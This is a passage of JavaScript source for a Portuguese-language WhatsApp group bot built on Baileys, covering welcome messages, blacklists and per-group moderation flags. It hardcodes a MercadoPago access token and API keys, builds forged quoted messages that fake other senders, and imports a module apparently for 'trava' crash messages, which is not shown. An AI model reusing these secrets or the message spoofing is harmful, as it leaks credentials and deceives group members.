/*============≠≠==========≠≠=============\\

👻⛦𝐏͢𝚵𝐋͢𝐀 𝐅͢𝚵𝐋͢𝐈𝐂͢𝐈𝐃𝐀͢𝐃𝚵͢ 𝐃𝚯͢ 𝐃𝐈͢𝐀𝐁͢𝚯⛦👻
⛦⸸ ͢𝐋𝐔͢𝐈𝐗 𝑶͢𝑭𝑭
 ⸸⛦👻⛦𝐏͢𝚵𝐋͢𝐀 𝐅͢𝚵𝐋͢𝐈𝐂͢𝐈𝐃𝐀͢𝐃𝚵͢ 𝐃𝚯͢ 𝐃𝐈͢𝐀𝐁͢𝚯⛦👻
//=======================================*/

const { default: makeWASocket, downloadContentFromMessage, useMultiFileAuthState, makeInMemoryStore, prepareWAMessageMedia, DisconnectReason, WAGroupMetadata, relayWAMessage,	MediaPathMap, mentionedJid, processTime, MediaType, Browser, MessageType, Presence, Mimetype, Browsers, delay, fetchLatestBaileysVersion, MessageRetryMap, extractGroupMetadata, generateWAMessageFromContent, proto} = require('@adiwajshing/baileys');

//_-_-_-_-_-_-_-_-_-_-MODULOS/FUNÇÕES-_-__-_-_-_-_-_-_-_-_-\\

const { PDT, PDT2 } = require("./armor/conect.js");

const { hx, fs, Boom, axios, chalk, yts, crypto, util, P, encodeUrl, linkfy, request, cheerio, ms, ffmpeg, imgbb, fetch, imageToBase64, webp2gifFile, webp_mp4, EmojiAPI, qrterminal, emoji, exec, spawn, execSync, moment, color, time, hora, date, getBuffer, convertSticker, recognize, fetchJson, fetchText, getBase64, createExif, insert, response, addLimit, getLimit, upload, nit, addBanned, unBanned, BannedExpired, cekBannedUser, isFiltered, addFilter, validmove, setGame, addComandosId, deleteComandos, getComandoBlock, getComandos, addComandos, palavrasANA, quizanime, quizanimais, getLevelingXp, getLevelingLevel, getLevelingId, addLevelingXp, addLevelingLevel, addLevelingId, bayarLimit, limitAdd, addATM, addKoinUser, checkATMuser, cdsert, getRegisteredRandomId, addRegisteredUser, createSerial, confirmATM, runtime, pratrp, getpc, supre, WinnerX, WinnerO, Tie, IA, IAmove1, IAalter, priorityC, addTTTId, addTTTwin, addTTTdefeat, addTTTtie, addTTTpoints, getTTTId, getTTTwins, getTTTdefeats, getTTTties, getTTTpoints, wait, getExtension, h2k, generateMessageID, getGroupAdmins, getRandom, banner2, start2, banner3, infopd, success, start, close, temporizador, cmdadd, addMetadata, chyt, ttthelp, tttme, tttset, esp, kyun, simih, botoff, fechar_abrir_gp, colors} = require('./consts-func.js')

//-_-_-_-_--__-_-_-_--_-JSON-FUNÇÕES-_-_-_-_-_-_-_-_-_-_-_-_\\

const { adeuscara, welcome_group, welcome_group2, bye_group, bye_group2, voting, sotoy, addVote, delVote, countMessage, countMessage_pv, comandos, welkom2, modobn, nsfw, daily, nescessario, welkom, premium, registrar, limitefll, antiflood, samih, samih2, _leveling, _level, bancht, anticall, ban, afk, joguinhodavelhajs, joguinhodavelhajs2, setting, logoslink, antilink, antifake, antilinkhard, autofigu, antilinkgp, antiporn, antiimg, antisticker, antinotas, antispam, antictt, anticatalogo, antidoc, antiloc, antipv, antivid, antiaudio, palavra, palavrao } = require('./consts-func.js')
//@Luix1397\\
const API_KEY_BRONXYS = "@Luix1397";
const { arcloud } = require('./armor/js/arcc')
const { climaDl } = require('./datab/js/clima')
const { ia } = require('./datab/js/ia')
const { eununca } = require('./armor/funcoes/eununca.js');
const { mediafireDl } = require('./datab/js/mediafire')
const { planos } = require('./menus/menuplanos.js')
const { trava } = require('./travas/trava.js')
const leveling = JSON.parse(fs.readFileSync('./datab/usuarios/leveling.json'))
const advertencia = JSON.parse(fs.readFileSync('./datab/advertencia/advertencia.json'))
const level = JSON.parse(fs.readFileSync('./datab/usuarios/level.json'))
const antispamcmd = JSON.parse(fs.readFileSync('./armor/funcoes/antispamcmd.json'))
//-_-_-_-_-_-_-_-_-_-_-JS-MENUS/INFORMAÇÕES-_-_-_-_-_-_-_-_-_-_\\

const { menu, menudono, menuplanos, adms, menulogos, efeitos, menuprem, brincadeiras ,infovotacao, infocontador, infobemvindo, infolistanegra, infopalavrao, infobancarac, infodono, gitdobot, configbot, hospedar, cmd_termux, alteradores, destrava, destrava2, tabela, conselhob, palavras } = require('./consts-func.js')

//_-_-_-_-_-_-_-_-_-_-_-_-(INFOS)_-_-_-_-_-_-_-_-_-_-_-_-_-_-_--\\

const { forwarding, imgnazista, imggay, imgcorno, imggostosa, imggostoso, imgfeio, imgvesgo, imgbebado, imggado, matarcmd, beijocmd, chutecmd, tapacmd } = require("./dono/nescessario.json")
const mercadopago = require('mercadopago');
mercadopago.configure({
    access_token: 'APP_USR-6881867726155733-051802-52a91c5b91b4ca7a1a1c31b62937db9a-537977402' //APP_USR-6881867726155733-051802-52a91c5b91b4ca7a1a1c31b62937db9a-537977402 <- TESTE 
});
//====================≠≠===============\\
 
cdd = nescessario.cdd

menu_audio = nescessario.menu_audio
 
consoleoff = nescessario.consoleoff 
 
botoes = nescessario.botoes
 
verificado = nescessario.verificado
 
crtt = nescessario.crtt
 
fundo1 = nescessario.fundo1

fundo2 = nescessario.fundo2
 
dono2 = nescessario.dono2

dono3 = nescessario.dono3
 
dono4 = nescessario.dono4

dono5 = nescessario.dono5
 
NomeDoBot = setting.NomeDoBot

NickDono = setting.NickDono

numerodono = setting.numerodono 

var prefix = setting.prefix 

banChats = nescessario.banChats 

logo = logoslink.logo

numbernye = '0'

blocked = [] 

hitt = []
//=====================================\\
var SeuToken = "@Luix1397"

var Luix1397 = "apikey_LuixxLindo-2023"
//=====================================\\

var msgRetryCounterMap = {};

async function startAle() {
  
const vcard = `BEGIN:VCARD\n`
+ `VERSION:3.0\n`
+ `FN:${NickDono}\n`
+ `TEL;type=CELL;type=VOICE;waid=${setting.numerodono}:${setting.numerodono}\n` 
+ `END:VCARD`

const vcardbot = `BEGIN:VCARD\n`
+ `VERSION:3.0\n`
+ `FN:${NomeDoBot}\n`
+ `TEL;type=CELL;type=VOICE;waid=553175416530:553191179654n` 
+ `END:VCARD`

// ABAIXO: INÍCIO DE CONEXÃO

var qrcode = "./LUIXBOT-QR.json"

const { state, saveCreds } = await useMultiFileAuthState(qrcode)

const conn = makeWASocket({
logger: P({ level: 'silent' }),
printQRInTerminal: true,
auth: state,
msgRetryCounterMap: MessageRetryMap,
defaultQueryTimeoutMs: undefined, 
keepAliveIntervalMs: 1000 * 60 * 10 * 3
});


conn.ev.process(
  
async(events) => {

// ========= || Advertências || ========= \\

const addAdvertirId = (userId, from) => {
const obj = {
grupo: from, pessoa: userId, advertencias: 0
}
advertencia.push(obj)
fs.writeFileSync('./datab/advertencia/advertencia.json', JSON.stringify(advertencia, null, 2) + '\n')
}
const addAdvertir = (userId, from, quanto) => {
let position = false; Object.keys(advertencia).forEach((i) => {
if (advertencia[i].pessoa === userId && advertencia[i].grupo === from ){ position = i }})
if (position !== false) {
advertencia[position].advertencias += quanto
fs.writeFileSync('./datab/advertencia/pessoasadv.json', JSON.stringify(advertencia, null, 2) + '\n')
}}
const getAdvertencia = (userId, from) => {
let position = false; Object.keys(advertencia).forEach((i) => {
if (advertencia[i].pessoa === userId && advertencia[i].grupo === from) { position = i }})
if (position !== false) { return advertencia[position].advertencias }
}
//===============(BEM VINDO)=============\\

if(events['group-participants.update']) {
const ale = events['group-participants.update']  

if(ale.participants[0].startsWith(conn.user.id.split(':')[0])) return 
const grpmdt = await conn.groupMetadata(ale.id)

const isAntiSpamcmd = antispamcmd.includes('Ativado')

const isGroup2 = grpmdt.id.endsWith('@g.us') 

const GroupMetadata_ = isGroup2 ? await conn.groupMetadata(ale.id): ""
const mdata_ = isGroup2 ? await conn.groupMetadata(ale.id): ""

// CONST DO CMD DE BANIR QUEM ESTIVER NA LISTA N

const dbackid = []
for(i=0;i<adeuscara.length;++i) dbackid.push(adeuscara[i].groupId)
console.log(ale)
if(dbackid.indexOf(ale.id) >= 0) {
if (ale.action == 'add'){ 
num = ale.participants[0]
var ind = dbackid.indexOf(ale.id)
if(adeuscara[ind].number.indexOf(num.split('@')[0]) >= 0) {
await conn.sendMessage(mdata_.id,{text: '*Olha quem deu as cara por aqui, sente o poder do ban cabaço*'})
conn.groupParticipantsUpdate(mdata_.id, [ale.participants[0]], 'remove')
return
}
}
}

// FIM LISTANEGRA CONST ^


// ANTIFAKE QUE ESTÁ JUNTO COM BEM VINDO 

if(antifake.includes(ale.id)) {
if (ale.action === 'add' && !ale.participants[0].startsWith(55)){
num = ale.participants[0]
conn.sendMessage(mdata_.id, {text: ' ⛹️⛹️Bye Bye Estrangeiro...👋🏌️'})
setTimeout(async() => {
conn.groupParticipantsUpdate(mdata_.id, [ale.participants[0]], 'remove')
}, 1000)
}
}

// FIM ANTIFAKE ^

// BEM VINDO COMPLETO 


if(welkom.includes(ale.id)) {
if(antifake.includes(ale.id) && !ale.participants[0].startsWith(55)) return
try {
  
// PEGAR DESCRIÇÃO DO GRUPO. 

const groupDesc = await GroupMetadata_.desc  
  
try {
ppimg = await conn.profilePictureUrl(ale.participants[0])
} catch {
ppimg = 'https://telegra.ph/file/d1153164ee72b1230769a.jpg'
}

try {
ppgp = await conn.profilePictureUrl(mdata_.id)
} catch {
ppgp = 'https://image.flaticon.com/icons/png/512/124/124034.png'
}

shortpc = await axios.get(`https://tinyurl.com/api-create.php?url=${ppimg}`)
shortgc = await axios.get(`https://tinyurl.com/api-create.php?url=${ppgp}`)

const groupIdWelcomed = []
const groupIdBye = []
for(let obj of welcome_group) groupIdWelcomed.push(obj.id)
for(let obj of bye_group) groupIdBye.push(obj.id)


const isByed = groupIdBye.indexOf(ale.id) >= 0 ? true : false

const isWelcomed = (groupIdWelcomed.indexOf(ale.id) >= 0) ? true : false

if(ale.action === 'add') {
if(isWelcomed) {
var ind = groupIdWelcomed.indexOf(ale.id)
teks = welcome_group[ind].msg
.replace('#hora#', time)
.replace('#nomedogp#', mdata_.subject)
.replace('#numerodele#', '@'+ale.participants[0].split('@')[0])
.replace('#numerobot#', conn.user.id)
.replace('#prefixo#', prefix)
.replace('#descrição#', groupDesc)
} else {
teks = welcome(ale.participants[0].split('@')[0], mdata_.subject)
}
let buff = await getBuffer(ppimg)
ran = getRandom('.jpg')
await fs.writeFileSync(ran, buff)

fs.unlinkSync(ran)
conn.sendMessage(mdata_.id, {image: {url:`http://aleatory-api.xyz:8080/welcome?titulo=BEM%20VINDO(A)&nome=${ale.participants[0].split('@')[0]}&perfil=${shortpc.data}&fundo=${fundo1}&grupo=BEM VINDO AO GRUPO ${encodeUrl(mdata_.subject)}`},
mentions: ale.participants, caption: teks})
} else if(ale.action === 'remove') {
mem = ale.participants[0]

try {
ppimg = await conn.profilePictureUrl(`${mem.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://telegra.ph/file/b5427ea4b8701bc47e751.jpg'
}

if(isByed) {
var ind = groupIdBye.indexOf(ale.id)
teks = bye_group[ind].msg
.replace('#hora#', time)
.replace('#nomedogp#', mdata_.subject)
.replace('#numerodele#', ale.participants[0].split('@')[0])
.replace('#numerobot#', conn.user.id)
.replace('#prefixo#', prefix)
.replace('#descrição#', groupDesc)
} else {
teks = bye(ale.participants[0].split('@')[0])
}

let buff = await getBuffer(ppimg)
ran = getRandom('.jpg')
fs.writeFileSync(ran, buff)
conn.sendMessage(mdata_.id, {image: {url:`http://aleatory-api.xyz:8080/welcome?titulo=Adeus&nome=${ale.participants[0].split('@')[0]}&perfil=${shortpc.data}&fundo=${fundo1}&grupo=SAIU DE ${encodeUrl(mdata_.subject)}`}, caption: teks, 
mentions: ale.participants})
 fs.unlinkSync(ran)
}
} catch (e) {
if(String(e).includes("bye is not defined")) {
console.log(color(`Mensagem de saiu do bem vindo não definida, mas não precisa definir,\nqualquer dúvida dúvida digita : ${prefix}infobemvindo no WhatsApp..`, "yellow"))
} else if(String(e).includes("welcome is not defined")) {
console.log(color(
`Mensagem do bem vindo não definida, qualquer dúvida digite : ${prefix}infobemvindo no WhatsApp..`, "red"))
} else {
console.log(e);
}
}
}
  
if(ale.participants[0].startsWith(conn.user.id.split(':')[0])) return 
if(welkom2.includes(ale.id)) {
if(antifake.includes(ale.id) && !ale.participants[0].startsWith(55)) return
try {

const GroupMetadata_2 = isGroup2 ? await conn.groupMetadata(ale.id): ""
  
const mdata_2 = isGroup2 ? await conn.groupMetadata(ale.id): ""


//=============(BATERIA)==============\\

conn.on('CB:action,,battery', json => {
const batteryLevelStr = json[2][0][1].value
const batterylevel = parseInt (batteryLevelStr)
battre = batterylevel 
if (json[2][0][1].live == 'true') charging = true
if (json[2][0][1].live == 'false') charging = false
console.log(json[2][0][1])
console.log(color('Carga da bateria: ' + batterylevel+'%', "pink"))
})
//==================================\\  

// PEGAR DESCRIÇÃO DO GRUPO

const groupDesc = await GroupMetadata_2.desc

const groupIdWelcomed2 = []
const groupIdBye2 = []
for(let obj of welcome_group2) groupIdWelcomed2.push(obj.id)
for(let obj of bye_group2) groupIdBye2.push(obj.id)


const isByed2 = groupIdBye2.indexOf(ale.id) >= 0 ? true : false

const isWelcomed2 = (groupIdWelcomed2.indexOf(ale.id) >= 0) ? true : false

if(ale.action === 'add') {
if(isWelcomed2) {
var ind = groupIdWelcomed2.indexOf(ale.id)
teks = welcome_group2[ind].msg
.replace('#hora#', time)
.replace('#nomedogp#', mdata_2.subject)
.replace('#numerodele#', '@'+ale.participants[0].split('@')[0])
.replace('#numerobot#', conn.user.id)
.replace('#prefixo#', prefix)
.replace('#descrição#', groupDesc)
} else {
teks = welcome(ale.participants[0].split('@')[0], mdata_2.subject)
}

conn.sendMessage(mdata_2.id, {text: teks, mentions: ale.participants})

} else if(ale.action === 'remove') {
mem = ale.participants[0]

if(isByed2) {
var ind = groupIdBye2.indexOf(ale.id)
teks = bye_group2[ind].msg
.replace('#hora#', time)
.replace('#nomedogp#', mdata_2.subject)
.replace('#numerodele#', ale.participants[0].split('@')[0])
.replace('#numerobot#', conn.user.id)
.replace('#prefixo#', prefix)
.replace('#descrição#', groupDesc)
} else {
teks = bye(ale.participants[0].split('@')[0])
}

conn.sendMessage(mdata_2.id, {text: teks, mentions: ale.participants})
 fs.unlinkSync(ran)
}
} catch (e) {
if(String(e).includes("bye is not defined")) {
console.log(color(
`Mensagem de saiu do bem vindo não definida, mas\nnão precisa definir, qualquer dúvida digita : ${prefix}infobemvindo no WhatsApp..`, "yellow"))
} else if(String(e).includes("welcome is not defined")) {
console.log(color(
`Mensagem do bem vindo não definida, qualquer dúvida digite : ${prefix}infobemvindo no WhatsApp..`, "red"))
} else {
console.log(e);
}
}
}
}
  
if(events['creds.update']) {
await saveCreds()
}  
  
if(events['messages.upsert']) {
async function msgupsrt() {
const upsert = events['messages.upsert']
if(upsert.type == PDT) return
for(const info of upsert.messages) {
if(!info.message) return 
const baileys = require('@adiwajshing/baileys');
var type = baileys.getContentType(info.message);
if (info.key && info.key.remoteJid == 'status@broadcast') return
let participant = info.key.participant;

global.prefix

global.blocked

const content = JSON.stringify(info.message)
const speed = require('performance-now');
const from = info.key.remoteJid
const isGroup = from.endsWith('@g.us')

if(fs.existsSync(`./func/prefixo/prefixo2_${from}.json`)) {
var prefixo2_on = JSON.parse(fs.readFileSync(`./func/prefixo/prefixo2_${from}.json`))
var prefix = prefixo2_on.prefixo
} else {
var prefix = setting.prefix 
}

//==============(BODY)================\\
var body = (type === 'conversation') ? info.message.conversation : (type == 'imageMessage') ? info.message.imageMessage.caption : (type == 'videoMessage') ? info.message.videoMessage.caption : (type == 'extendedTextMessage') ? info.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? info.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? info.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'templateButtonReplyMessage') ? info.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (info.message.buttonsResponseMessage?.selectedButtonId || info.message.listResponseMessage?.singleSelectReply.selectedRowId || info.text) : ''

const args = body.trim().split(/ +/).slice(1)

const q = args.join(' ')

if(fs.existsSync(`./func/limitecaracteres/limite-c_${from}.json`)) {
var limitecaracteres_on = JSON.parse(fs.readFileSync(`./func/limitecaracteres/limite-c_${from}.json`))
var limitefl = limitecaracteres_on.limite
} else {
var limitefl = limitefll.limitefl
}

var budy2 = body.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");

if(fs.existsSync(`./func/prefixo/prefixo2_${from}.json`)) {
var prefixo2_on = JSON.parse(fs.readFileSync(`./func/prefixo/prefixo2_${from}.json`))
var isCmd = budy2.startsWith(prefixo2_on.prefixo)
} else {
var isCmd = budy2.startsWith(prefix)  
}

if(!isCmd && info.key.fromMe) return

if(!isCmd && type === "stickerMessage") return

const command = isCmd ? budy2.slice(1).trim().split(/ +/).shift().toLocaleLowerCase() : null


//=======================================\\


//===============(BUDY)==================\\

var budy = (type === 'conversation') ? info.message.conversation : (type === 'extendedTextMessage') ? info.message.extendedTextMessage.text : ''
//======================================\\

var pes = (type === 'conversation' && info.message.conversation) ? info.message.conversation : (type == 'imageMessage') && info.message.imageMessage.caption ? info.message.imageMessage.caption : (type == 'videoMessage') && info.message.videoMessage.caption ? info.message.videoMessage.caption : (type == 'extendedTextMessage') && info.message.extendedTextMessage.text ? info.message.extendedTextMessage.text : ''


//=====================================\\

const groupMetadata = isGroup ? await conn.groupMetadata(from) : ''
const nmrdn_dono2 = setting.numerodono.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net";

const groupName = isGroup ? groupMetadata.subject : ''

const sender = isGroup ? info.key.participant.includes(':') ? info.key.participant.split(':')[0] +'@s.whatsapp.net': info.key.participant : info.key.remoteJid

const pushname = info.pushName ? info.pushName : ''

const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()

const arg = body.substring(body.indexOf(' ') + 1)

const botNumber = conn.user.id.split(':')[0]+'@s.whatsapp.net'
const argss = body.split(/ +/g)
const testat = body
const ants = body
const tescuk = ["0@s.whatsapp.net"]

const groupDesc = isGroup ? groupMetadata.desc : ''

const groupMembers = isGroup ? groupMetadata.participants : ''

const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''

//=======================================\\

const nmrdn = setting.numerodono.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`

const numerodono = [`${nmrdn}`, `${nescessario.dono1}@s.whatsapp.net`, `${nescessario.dono2}@s.whatsapp.net`, `${nescessario.dono3}@s.whatsapp.net`, `${nescessario.dono4}@s.whatsapp.net`, `${nescessario.dono5}@s.whatsapp.net`, `${nescessario.dono6}@s.whatsapp.net`]

//============(SORTEIO-CONST)============\\

const { infosorteio } = require('./armor/js/infosorteio.js')

//===========(enviar.espere)=============\\

const { mensagens } = require('./armor/js/aleatoria.js');

const { sortear } = require('./armor/js/aleatoria.js');

var enviarmen = mensagens[Math.floor(Math.random() * mensagens.length)] 
//========================================\\

//=======(ADMS/DONO/ETC..CONST)========\\

const quoted = info.quoted ? info.quoted : info

const isBot = info.key.fromMe ? true : false

const SoDono = numerodono.includes(sender) || isBot

const DonoOficial = setting.numerodono.includes(sender) 

const isPremium = premium.includes(sender)


const isBotGroupAdmins = groupAdmins.includes(botNumber) || false

const isGroupAdmins = groupAdmins.includes(sender) || false 

//============(FUNÇÕES)============\\

const isWelkom2 = isGroup ? welkom2.includes(from) : true

const isVote = isGroup ? voting.includes(from) : false

const isModobn =  isGroup ? modobn.includes(from) : true

const isPuxadas =  isGroup ? modobn.includes(from) : true

const isNsfw =  isGroup ? nsfw.includes(from) : true

const isSimi = isGroup ? samih.includes(from) : false

const isSimi2 = isGroup ? samih2.includes(from) : false

const isBanned = ban.includes(sender)

//===========(ANTIS-PROTEÇÕES)===========\\

const isAntifake = isGroup ? antifake.includes(from) : false

const isAntiCtt = isGroup ? antictt.includes(from) : false

const isAnticatalogo = isGroup ? anticatalogo.includes(from) : false

const isAntiFlood = isGroup ? antiflood.includes(from) : false	

const isnit = nit.includes(sender) 

const isAntiLinkHard = isGroup ? antilinkhard.includes(from) : false

const isAutofigu = isGroup ? autofigu.includes(from) : false

const isJoguin = isGroup ? joguinhodavelhajs.includes(sender) : false

const isAntilinkgp = isGroup ? antilinkgp.includes(from) : false

const isAntiPorn = isGroup ? antiporn.includes(from) : false

const isAntiAudio = isGroup ? antiaudio.includes(from) : false	
	
const isAntiImg = isGroup ? antiimg.includes(from) : false

const isAntiSticker = isGroup ? antisticker.includes(from) : false

const isAntiNotas = isGroup ? antinotas.includes(from) : false

const Antidoc = isGroup ? antidoc.includes(from) : false

const Antiloc = isGroup ? antiloc.includes(from) : false

const isAntiVid = isGroup ? antivid.includes(from) : false	

const ischyt = chyt.includes(sender)

const isAntiPv = (antipv.indexOf('Ativado') >= 0) ? true : false	

const isAnticall = (anticall.indexOf('Ativado') >= 0) ? true : false

const isPalavrao = isGroup ? palavrao.includes(from) : false	

const isViewOnce = (type == 'viewOnceMessage')
//-----------------------------------------//
           const confirmATM = (sender, amount) => {
          let position = false
            Object.keys(dinheiro).forEach((i) => {
                if (dinheiro[i].id === from) {
                    position = i
                }
            })
            if (position !== false) {
                dinheiro[position].dinheiro -= amount
                fs.writeFileSync('./armor/funcoes/dinheiro.js', JSON.stringify(dinheiro))
            }
        }                 
        

         //BALANCEAMENTO DA MOEDA/DINHERO DO BOT       
              
             const checkATM = checkATMuser(sender)
             try {
                 if (checkATM === undefined) addATM(sender)
              } catch (err) {
                 console.error(err)
             }
//=======================================\\

if(botoff.includes(from) && !SoDono) return 

enviar = {
espere: `${enviarmen}`,
successo: '️❬ 👻 ❭ Sucesso ',
levelon: '❬ 👻 ❭ *leveling* *ativado*',
leveloff: '❬ 👻 ❭  *leveling* *desativado*',
levelnoton: '❬ 👻 ❭ *leveling não ativado*',
levelnol: '*ERROR BRO* 😒 °-°',
error: {
stick: '*falhou, tente novamente ^_^*',
Iv: 'Link invalido ☹️'
},
msg: {
grupo: '『❗』 Este comando só pode ser usado em grupos! ❌',
premium: `『👻』 *𝐄𝐒𝐒𝐄 𝐂𝐎𝐌𝐀𝐍𝐃𝐎 𝐒Ó 𝐏𝐎𝐃𝐄 𝐒𝐄𝐑 𝐔𝐒𝐀𝐃𝐎 𝐒𝐄 𝐅𝐎𝐑 𝐕𝐈𝐏 𝐂𝐎𝐌𝐏𝐑𝐄 𝐀𝐆𝐑 𝐒𝐄𝐔 𝐕𝐈𝐏 𝐃𝐈𝐆𝐈𝐓𝐀𝐍𝐃𝐎: ${prefix}alugar*`,
registrar: '⚡ *você Nao esta registrado digite: !registrar para c Registrar 👥*',
mod: `『❗』 ESTE PEDIDO É ESPECÍFICO PARA USUARIO MOD ${setting.NickDono}*`,
banido: '❌ Você foi banido de utilizar os comandos, entre em contato com o proprietário pra saber o porque ❌' ,
donosmt: '『❗』 Este é um recurso especial para o proprietário ❌',
donosmt2: '『❗』 Este é um recurso especial para o proprietário ❌',
adm: '『❗』 Este comando só pode ser usado por administradores de grupo! ❌',
Badmin: ' 『❗』 Este comando só pode ser usado quando o bot se torna administrador! ❌',
}
}

//=========(CONSTS-FUNÇÕES)============\\

const isWelkom = isGroup ? welkom.includes(from) : false

const issupre = supre.includes(sender)

const isLevelingOn = isGroup ? _leveling.includes(from) : false

const isBanchat = isGroup ? bancht.includes(from) : false	

//=====================================\\


//==========(SELOS)===============\\



var blalogoofc = getBuffer(`${logo}`)

if(verificado === true) {
var selo = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "17608914335-1625305606@g.us" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `◈ 月⃟🤬亮 ☾ ٭ ꪶ͢͜𝐋𝐔𝐈𝐗͢-𝐁𝚯𝐓ꫂ ٭ ☾ 亮🤬⃟月 ◈\n🏴‍☠️「℘𝑅𝛯𝐹ቾ乂𝛩」↛ 『${prefix}』️\n🥷Usuário: ${pushname}`, 'jpegThumbnail': blalogoofc}}}
} else {
var selo = info
}
const selo6 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ... {}}, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD` }}}
const selo2 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${NickDono}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;megumin,;;;\nFN:megumin,\nitem1.TEL;item1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync(`./luixft.jpg`), thumbnail:fs.readFileSync(`./luixft.jpg`),sendEphemeral: true}}}
const samp = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `João Vitor`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;megumin,;;;\nFN:megumin,\nitem1.TEL;item1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync(`./dex.jpg`), thumbnail:fs.readFileSync(`./dex.jpg`),sendEphemeral: true}}}
const LiveVR = {key : {participant : '0@s.whatsapp.net'},message: {liveLocationMessage: {}}}
const selo3 ={"key": {   "fromMe": false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 10,status: 200, thumbnail: fs.readFileSync(`./luixbt.jpg`), surface: 200, message: `Made with ❣️ `, orderTitle: 'sacole', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const selo4 ={"key": {   "fromMe": false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 99999999,status: 200, thumbnail: fs.readFileSync(`./luixbt.jpg`), surface: 200, message: `${NickDono} `, orderTitle: 'sacole', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const selo5 ={"key": {   "fromMe": false,"participant":"0@s.whatsapp.net",   "remoteJid": "556293294732-1625944593@g.us"  }, "message": {orderMessage: {itemCount: 34,status: 200, thumbnail: fs.readFileSync(`./luixbt.jpg`), surface: 200, message: ` `, orderTitle: 'sacole', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
//===============SELOS==================\\

const menc_prt = info.message?.extendedTextMessage?.contextInfo?.participant

const menc_jid = args.join(" ").replace("@", "") + "@s.whatsapp.net"

const reply = (texto) => {
conn.sendMessage(from, { text: texto }, {quoted: info}).catch(e => {
console.log(e.stack)
})
}

const getGroup = async function(totalchat){
let grup = []
let a = []
let b = []
for (c of totalchat){
a.push(c.id)
}
for (d of a){
if (d && d.includes('g.us')){
b.push(d)
}
}
for (e of b){
let ingfo = await conn.groupMetadata(e)
grup.push(ingfo)
}
return grup
}  
//◈ 月⃟亮 ☾ ٭ ꪶ͢͜𝐋𝐔𝐈𝐗͢-𝐁𝚯𝐓ꫂ ٭ ☾ 亮⃟月 ◈ 

const isUrl = (url) => {
if(linkfy.find(url)[0]) return true
return false
}	

const time2 = moment().tz('America/Sao_Paulo').format('HH:mm:ss')
if(time2 > "00:00:00"){
var tempo = 'Boa madrugada'
                                        } 
if(time2 > "05:30:00"){
var tempo = 'Bom dia'
                                        }
if(time2 > "12:00:00"){
var tempo = 'Boa tarde'
                                        }
if(time2 > "19:00:00"){
var tempo = 'Boa noite'
                                        }


const getFileBuffer = async (mediakey, MediaType) => {
  
const stream = await downloadContentFromMessage(mediakey, MediaType)

let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
return buffer
}

const sendSticker = (from, filename, info) => {
conn.sendMessage(from, {sticker: filename}, {quoted: info})
}

const sendImage = (ytb) => {
conn.sendMessage(from, {image: ytb}, {quoted:info})
}


const sendMess = (hehe, ytb) => {
conn.sendMessage(hehe, {text: ytb})
}


const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? conn.sendMessage(from, {text: teks.trim(), mentions: memberr}) : conn.sendMessage(from, {text: teks.trim(), mentions: memberr})
}
	
const costum = (pesan, tipe, target, target2) => {
conn.sendMessage(from, pesan, tipe, {quoted: {key: {fromMe: false, participant: `${target}`, ...(from ? {remoteJid: from}: {})}, message: {conversation: `${target2}` }}})
}


const groupIdWelcomed = []	
for(let obj of welcome_group) groupIdWelcomed.push(obj.id)

const groupIdBye = []
for(let obj of bye_group) groupIdBye.push(obj.id)

const isWelcomed = (groupIdWelcomed.indexOf(from) >= 0) ? true : false

const isByed = (groupIdBye.indexOf(from) >= 0) ? true : false

const groupIdWelcomed2 = []	

for(let obj of welcome_group2) groupIdWelcomed2.push(obj.id)

const groupIdBye2 = []

for(let obj of bye_group2) groupIdBye2.push(obj.id)


const isWelcomed2 = (groupIdWelcomed2.indexOf(from) >= 0) ? true : false

const isByed2 = (groupIdBye2.indexOf(from) >= 0) ? true : false	
	
	
//=====(FUNÇÃO-CHECAR-LIMIT)====\\
const checkLimit = (sender) => {
let found = false
for (let lmt of _limit) {
if (lmt.id === sender) {
let limitCounts = limitawal - lmt.limit
